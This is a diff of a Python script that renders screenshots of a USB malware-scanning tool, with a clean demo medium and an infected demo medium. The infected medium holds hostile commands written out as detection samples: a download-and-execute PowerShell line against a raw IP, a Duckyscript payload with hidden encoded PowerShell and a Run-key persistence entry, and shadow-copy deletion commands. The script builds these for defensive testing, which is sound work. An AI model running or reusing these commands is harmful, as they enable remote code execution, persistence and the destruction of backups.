@@ -5,11 +5,12 @@ The images in docs/images are produced by running the actual QML interface
 offscreen, driving it with a synthetic medium, and grabbing the window.  They
 are not mock-ups: every number in them comes from a real run of the pipeline.
 
-    python3 scripts/make-screenshots.py [--output docs/images] [--keep]
+    python3 scripts/make-screenshots.py [--output docs/images]
 
-The script builds its sample medium in a temporary directory (EICAR, a
+The script builds two sample media in a temporary directory: a clean one that
+holds nothing but ordinary documents, and an infected one that adds EICAR, a
 Duckyscript payload, an autorun.inf, a double extension, a packed-looking
-executable, PowerShell and batch scripts) so nothing outside the repository is
+executable, PowerShell and batch scripts.  Nothing outside the repository is
 touched.  Rendering uses the KDE desktop style when it is available.
 """
 
@@ -37,9 +38,11 @@ from PyQt6.QtQml import QQmlApplicationEngine  # noqa: E402
 from PyQt6.QtQuick import QQuickWindow  # noqa: E402
 
 import dcs.core.device as device_module  # noqa: E402
+import dcs.core.pipeline as pipeline_module  # noqa: E402
 import dcs.gui.backend as backend_module  # noqa: E402
 from dcs.core.config import load_config  # noqa: E402
 from dcs.core.device import BlockDevice  # noqa: E402
+from dcs.core.upload.base import UploadResult  # noqa: E402
 from dcs.gui.app import find_qml_imports, qml_directory  # noqa: E402
 from dcs.gui.backend import Backend  # noqa: E402
 
@@ -96,48 +99,107 @@ class SilentNotifier:
         return ""
 
 
-def make_medium(root: Path, *, nested_files: int = 1500) -> None:
+def make_medium(root: Path, *, nested_files: int = 1500, samples: bool = False) -> None:
+    """Write one demo medium, with enough files for progress to move.
 
-    """A medium with enough files to show progress, and a few nasty ones."""
+    ``samples`` adds the handful of nasty files.  The medium behind the
+    ``clean verdict`` screenshot is built without them: a screenshot that
+    captions a clean verdict while the findings list shows EICAR is worse than
+    no screenshot at all.
+    """
     (root / "Documents").mkdir(parents=True, exist_ok=True)
     (root / "Pictures").mkdir(parents=True, exist_ok=True)
     for index in range(nested_files):
         folder = "Documents" if index % 2 else "Pictures"
-        (root / folder / f"note-{index:04d}.txt").write_text("holiday notes\n" * 30, encoding="utf-8")
-
-    eicar = b"X5O!P%@AP[4" + bytes([92]) + b"PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
-    (root / "eicar.com").write_bytes(eicar)
-    (root / "payload.txt").write_text(
-        "\n".join(
-            [
-                "REM Duckyscript payload",
-                "DELAY 1000",
-                "GUI r",
-                "DELAY 500",
-                "STRING powershell -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
-                "ENTER",
-                "DELAY 2000",
-                "STRING reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v updater /d %TEMP%\\\\a.exe",
-                "ENTER",
-            ]
+        (root / folder / f"note-{index:04d}.txt").write_text(
+            "holiday notes\n" * 30, encoding="utf-8"
         )
-        + "\n",
-        encoding="utf-8",
-    )
-    (root / "autorun.inf").write_text("[autorun]\nopen=setup.exe\n", encoding="utf-8")
-    setup = bytearray(4096)
-    setup[0:2] = b"MZ"
-    struct.pack_into("<I", setup, 0x3C, 0x80)
-    setup[0x80:0x84] = b"PE\x00\x00"
-    struct.pack_into("<HHI", setup, 0x84, 0x8664, 2, 0x5F000000)
-    (root / "setup.exe").write_bytes(bytes(setup))
-    (root / "invoice.pdf.exe").write_bytes(bytes(setup))
-    (root / "update.ps1").write_text(
-        "IEX (New-Object Net.WebClient).DownloadString('http://185.11.22.33/a.ps1')\n", encoding="utf-8"
-    )
-    (root / "cleanup.bat").write_text(
-        "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n", encoding="utf-8"
-    )
+
+    if samples:
+        eicar = (
+            b"X5O!P%@AP[4"
+            + bytes([92])
+            + b"PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
+        )
+        (root / "eicar.com").write_bytes(eicar)
+        (root / "payload.txt").write_text(
+            "\n".join(
+                [
+                    "REM Duckyscript payload",
+                    "DELAY 1000",
+                    "GUI r",
+                    "DELAY 500",
+                    "STRING powershell -w hidden -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
+                    "ENTER",
+                    "DELAY 2000",
+                    "STRING reg add HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /v updater /d %TEMP%\\\\a.exe",
+                    "ENTER",
+                ]
+            )
+            + "\n",
+            encoding="utf-8",
+        )
+        (root / "autorun.inf").write_text("[autorun]\nopen=setup.exe\n", encoding="utf-8")
+        setup = bytearray(4096)
+        setup[0:2] = b"MZ"
+        struct.pack_into("<I", setup, 0x3C, 0x80)
+        setup[0x80:0x84] = b"PE\x00\x00"
+        struct.pack_into("<HHI", setup, 0x84, 0x8664, 2, 0x5F000000)
+        (root / "setup.exe").write_bytes(bytes(setup))
+        (root / "invoice.pdf.exe").write_bytes(bytes(setup))
+        (root / "update.ps1").write_text(
+            "IEX (New-Object Net.WebClient).DownloadString('http://185.11.22.33/a.ps1')\n",
+            encoding="utf-8",
+        )
+        (root / "cleanup.bat").write_text(
+            "vssadmin delete shadows /all /quiet\nwmic shadowcopy delete\n", encoding="utf-8"
+        )
+
+
+#: the link the stand-in provider reports, so the screenshots show a link
+DEMO_SHARE_LINK = "https://files.catbox.moe/dcs-demo-sandisk16.zip"
+
+
+class DemoProvider:
+    """Stands in for a real upload host while the screenshots are taken.
+
+    Every number in the screenshots has to come from a real pipeline run, but a
+    real run would push the demo archive to a public host: the documentation
+    would depend on the network, the file would be published for no reason and
+    the screenshot itself would leak a live link.  The provider is therefore
+    replaced with one that answers exactly like a working host, and the pipeline
+    around it is untouched.
+    """
+
+    label = "Catbox"
+    slug = "catbox"
+
+    def __init__(self, **kwargs: object) -> None:
+        pass
+
+    def availability(self) -> tuple[bool, str]:
+        return True, ""
+
+    def upload(
+        self,
+        path: str,
+        *,
+        progress: Any = None,
+        cancel: Any = None,
+        part_label: str = "",
+    ) -> UploadResult:
+        size = os.path.getsize(path)
+        if progress is not None:
+            progress(size, size)
+        return UploadResult(
+            ok=True,
+            link=DEMO_SHARE_LINK,
+            provider=self.label,
+            path=str(path),
+            size=size,
+            duration=1.4,
+            detail=f"demo upload{(' ' + part_label) if part_label else ''}",
+        )
 
 
 class Shot:
@@ -152,21 +214,25 @@ class Shot:
 
     def run(self) -> int:
         app = QGuiApplication(sys.argv[:1])
+        # the clean medium carries nothing but ordinary documents
         medium = Path(tempfile.mkdtemp(prefix="dcs-shot-"))
         (medium / "usb").mkdir()
         make_medium(medium / "usb")
         self.medium = medium / "usb"
         infected = Path(tempfile.mkdtemp(prefix="dcs-shot-bad-"))
-        make_medium(infected / "usb", nested_files=60)
+        make_medium(infected / "usb", nested_files=60, samples=True)
         self.infected = infected / "usb"
 
         device_module.list_removable_devices = lambda **_: list(DEMO_DEVICES)
+        # The archive is really built and the upload really runs, but against a
+        # host that only exists inside this process: see DemoProvider.
+        pipeline_module.build_provider = lambda *args, **kwargs: DemoProvider()
 
         config = load_config(path=str(medium / "config.toml"))
         config.source_path = str(medium / "config.toml")
         config.general.output_dir = str(medium / "out")
         config.report.directory = str(medium / "reports")
-        config.upload.enabled = False
+        config.upload.enabled = True
         config.email.enabled = False
         config.gui.switch_to_result = False
         # The window is created at its final size.  Resizing it after the first
@@ -190,7 +256,9 @@ class Shot:
         window.show()
         self.pump(app, 0.6)
         assert window.property("width") == WINDOW_WIDTH, f"window width {window.property('width')}"
-        assert window.property("height") == WINDOW_HEIGHT, f"window height {window.property('height')}"
+        assert window.property("height") == WINDOW_HEIGHT, (
+            f"window height {window.property('height')}"
+        )
         backend.refreshDevices()
         backend.selectDevice(0)
         self.tab(window, 0)
@@ -203,8 +271,8 @@ class Shot:
                 "source": str(self.medium),
                 "label": "SANDISK16",
                 "scan": True,
-                "archive": False,
-                "upload": False,
+                "archive": True,
+                "upload": True,
                 "email": False,
             }
         )
@@ -212,7 +280,13 @@ class Shot:
         deadline = time.time() + 60
         while backend.state == "running" and time.time() < deadline:
             app.processEvents(QEventLoop.ProcessEventsFlag.AllEvents, 20)
-            if not captured and backend.findings.count >= 2 and backend.throughput.rowCount() >= 3:
+            # the scan is well under way once the first samples are in the chart;
+            # waiting for a finding would never happen on a clean medium
+            if (
+                not captured
+                and backend.throughput.rowCount() >= 3
+                and backend.overallPercent >= 0.20
+            ):
                 self.shot(window, "live-view.png")
                 captured = True
             time.sleep(0.005)
@@ -220,6 +294,7 @@ class Shot:
             self.shot(window, "live-view.png")
         self.wait_for(app, backend, 120)
 
+        self.check_clean(backend)
         self.tab(window, 2)
         self.shot(window, "result-view.png")
 
@@ -236,6 +311,8 @@ class Shot:
             }
         )
         self.wait_for(app, backend, 180)
+
+        self.check_infected(backend)
         self.tab(window, 2)
         self.shot(window, "result-infected.png")
 
@@ -281,6 +358,35 @@ class Shot:
         for warning in relevant[:5]:
             print("  -", warning)
         return 1 if relevant else 0
+
+    # -- guards ----------------------------------------------------------
+    @staticmethod
+    def check_clean(backend: Backend) -> None:
+        """Refuse to caption a screenshot as clean when the run found something.
+
+        The screenshots are documentation first and pictures second: a "clean
+        verdict" that shows a threat list is a lie about the tool.
+        """
+        summary = backend.summary
+        verdict = str(summary.get("verdict", ""))
+        link = str(summary.get("shareLink", ""))
+        print(f"clean run: verdict={verdict} findings={backend.findings.count} link={link}")
+        assert verdict == "clean", f"the clean medium came out {verdict!r}"
+        assert backend.findings.count == 0, (
+            f"{backend.findings.count} finding(s) on the clean medium"
+        )
+        assert int(summary.get("findingCount") or 0) == 0, "the summary reports findings"
+        assert link == DEMO_SHARE_LINK, f"the clean run produced no demo link (got {link!r})"
+
+    @staticmethod
+    def check_infected(backend: Backend) -> None:
+        """Refuse to caption a screenshot as infected when nothing was found."""
+        summary = backend.summary
+        verdict = str(summary.get("verdict", ""))
+        print(f"infected run: verdict={verdict} findings={backend.findings.count}")
+        assert verdict in ("infected", "suspicious"), f"the infected medium came out {verdict!r}"
+        assert backend.findings.count > 0, "the infected medium produced no findings"
+        assert not summary.get("shareLink"), "an infected run must not publish a link"
 
     # -- helpers ---------------------------------------------------------
     @staticmethod
